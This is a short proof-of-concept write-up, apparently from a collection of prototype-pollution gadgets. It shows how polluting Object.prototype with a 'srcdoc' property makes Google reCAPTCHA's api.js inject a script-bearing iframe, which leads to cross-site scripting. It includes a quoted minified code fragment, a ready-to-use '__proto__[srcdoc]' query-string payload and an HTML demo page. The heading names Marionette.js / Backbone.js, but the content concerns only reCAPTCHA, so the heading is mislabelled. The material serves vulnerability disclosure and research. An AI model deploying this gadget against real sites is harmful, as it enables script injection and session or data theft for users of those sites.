## Marionette.js / Backbone.js

URL: https://www.google.com/recaptcha/api.js
URL: https://www.gstatic.com/recaptcha/releases/Y5tQ3lKwn1XL5hGgLz1kR4-1/recaptcha__en.js

### Vulnerable code fragment
```js

  if (1 == (g = ["object", 8, "rc-imageselect-tile"], (m ^ 412) & 7)) {
                        for (I = (k = ["allow-modals", (x.src = ((D = (FQ(x, {
                                frameborder: "0",
                                scrolling: "no",
                                sandbox: "allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation"
                            }), x.src), D instanceof Lr) ? U = D : (D = typeof D == g[0] && D.N4 ? D.mQ() : String(D), Jw.test(D) ? w = new Lr(D, l6) : (b = String(D), K = b.replace(/(%0A|%0D)/g, E), w = (d = K.match(MZ)) && so.test(d[1]) ? new Lr(K, l6) : null),
                                U = w), f[38](30, U || zw)), "allow-popups-to-escape-sandbox"), "allow-storage-access-by-user-activation"], q = jm("IFRAME", x), Z); I < k.length; I++) q.sandbox && q.sandbox.supports && q.sandbox.add && q.sandbox.supports(k[I]) && q.sandbox.add(k[I]);
                        M = q
                    }

....

 jm = function(m, E, Z) {
            return f[29](12, "", ">", document, arguments)
        }
....


 f[29](12, "", ">", document, arguments) returns polluted properties as attributes along with attributes in arguments parameter =>  <iframe src=URL width="304" height="78" role="presentation" name="a-yu3h8xgaya5g" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation" srcdoc="<script>alert(document.domain)</script>"></iframe>

```

### PoC

```
?__proto__[srcdoc][]=<script>alert(document.domain)</script>
```

```html

<html>
  <head>
    <title>reCAPTCHA demo: Simple page</title>
	<script>
		Object.prototype.srcdoc=["<script>alert(document.domain)<\/script>"]
	</script>
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
  </head>
  <body>
    <form action="?" method="POST">
      <div class="g-recaptcha" data-sitekey="your-site-key"></div>
      <br/>
      <input type="submit" value="Submit">
    </form>
  </body>
</html>

```
